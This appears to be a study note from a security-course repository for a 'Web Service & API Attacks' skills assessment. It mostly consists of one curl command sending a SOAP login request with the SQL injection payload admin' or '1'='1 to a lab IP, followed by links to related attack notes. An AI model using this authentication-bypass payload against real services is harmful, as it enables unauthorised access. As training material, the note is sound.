# Web Service & API Attacks - Skills Assessment

```bash
curl -X POST http://10.129.202.133:3002/wsdl \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"Login\"" \
  -d "<?xml version='1.0' encoding='utf-8'?>
<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:tem='http://tempuri.org/'>
   <soapenv:Header/>
   <soapenv:Body>
      <tem:LoginRequest>
         <tem:username>admin' or '1'='1</tem:username>
         <tem:password>your_password</tem:password>
      </tem:LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>"
```

## Material relacionado

- [Command Injection](../../../Web-Security/API/command-injection.md)
- [File Upload](../../../Web-Security/API/file-upload.md)
- [Information Disclosure (with a twist of SQLi)](../../../Web-Security/API/information-disclosure-with-a-twist-of-sqli.md)
- [LFI](../../../Web-Security/API/lfi.md)
- [SSRF](../../../Web-Security/API/ssrf.md)
- [WSDL](../../../Web-Security/API/wsdl.md)
- [XSS](../../../Web-Security/API/xss.md)
- [XXE](../../../Web-Security/API/xxe.md)


## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | 18- Web Service & API Attacks/9 - Web Service & API Attacks - Skills Assessment.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../../README.md) · [Inicio](../../../README.md)
